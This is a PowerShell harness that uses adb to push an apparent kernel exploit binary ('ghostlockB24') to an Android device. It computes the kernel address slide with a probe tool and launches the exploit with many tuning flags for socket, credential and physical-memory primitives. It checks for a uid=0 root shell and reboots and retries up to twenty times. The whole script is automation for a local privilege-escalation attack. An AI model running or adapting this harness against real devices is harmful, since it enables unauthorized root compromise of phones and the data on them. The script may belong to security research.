$adb = 'E:\Library\Desktop\platform-tools-latest-windows\platform-tools\adb.exe'
$bin = 'E:\Library\Desktop\ghostlock\ghostlockB24_a64'
$log = 'E:\Library\Desktop\ghostlock\_dn_e2e7.log'
function L($m){ $m | Out-File -FilePath $log -Append -Encoding utf8; Write-Output $m }
"=== e2e7 start $(Get-Date) (UMH path -> root daemon) ===" | Out-File -FilePath $log -Encoding utf8
$max = 20; $ok = $false
for ($att = 1; $att -le $max; $att++) {
  L ""; L "----- attempt $att / $max -----"
  for ($k=0; $k -lt 30; $k++){ & $adb wait-for-device *> $null; $d=(& $adb devices 2>$null) -join ' '; if ($d -match '\bdevice\b') { break }; Start-Sleep 5 }
  for ($i=0; $i -lt 90; $i++){ $bc=(& $adb shell getprop sys.boot_completed 2>$null) -join ''; if ($bc.Trim() -eq '1'){break}; Start-Sleep 5 }
  L "settling 90s"; Start-Sleep -Seconds 90
  & $adb push $bin /data/local/tmp/ghostlockB24 *> $null
  # verify push size (guard against the 0-byte incident)
  $sz = (& $adb shell "wc -c < /data/local/tmp/ghostlockB24 2>/dev/null" 2>$null) -join ''
  if (-not ($sz.Trim() -match '^1[0-9]{6}$')) { L "push size bad ($sz); re-push"; & $adb push $bin /data/local/tmp/ghostlockB24 *> $null }
  & $adb shell "chmod 755 /data/local/tmp/ghostlockB24; cp -f /data/local/tmp/ghostlockB24 /data/local/tmp/a/e; chmod 755 /data/local/tmp/a/e; rm -f /data/local/tmp/.ghostlock_rootshell /data/local/tmp/umh_root_proof" *> $null
  $sp = (& $adb shell "cd /data/local/tmp && timeout 40 ./slideprobe > sp7.log 2>&1; grep -a -m1 bd4 sp7.log" 2>$null) -join "`n"
  if ($sp -match '([0-9a-f]{16})') { $low=$matches[1].Substring(8); $slide=[uint32]([Convert]::ToUInt32($low,16)) - 0x8000000 - 0x3bd4 }
  else { L "probe fail; reboot"; & $adb reboot *> $null; Start-Sleep 20; continue }
  $sx='0x{0:x}' -f $slide; L "slide=$sx"
  $cmd = "cd /data/local/tmp && rm -f gl7.log; nohup sh -c 'ONLY_FOPS=1 SKIP_CRED=1 FORCE_REDIRECT=1 SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 SSOPT_PEEK=1 SSOPT_HOLD=0 SSOPT_OWNER0=0 PSELECT_ROUTE_DELAY_USEC=0 ROUTE_SETSOCKOPT=1 SLIDE=$sx timeout 150 ./ghostlockB24 > gl7.log 2>&1' >/dev/null 2>&1 & echo STARTED"
  & $adb shell $cmd *> $null
  Start-Sleep -Seconds 80
  $r = (& $adb shell "grep -a -e 'umh: result' -e 'cfi FAIL' -e 'physrw' /data/local/tmp/gl7.log 2>/dev/null | tail -4" 2>$null) -join ' || '
  L "result: $r"
  $rs = (& $adb shell "cat /data/local/tmp/.ghostlock_rootshell 2>/dev/null" 2>$null) -join ''
  L "rootshell: $rs"
  if ($rs -match 'uid=0') { L "*** ROOT SHELL UP attempt $att ***"; $ok=$true; break }
  L "no root; reboot"; & $adb reboot *> $null; Start-Sleep -Seconds 25
}
L "=== e2e7 done ok=$ok $(Get-Date) ==="
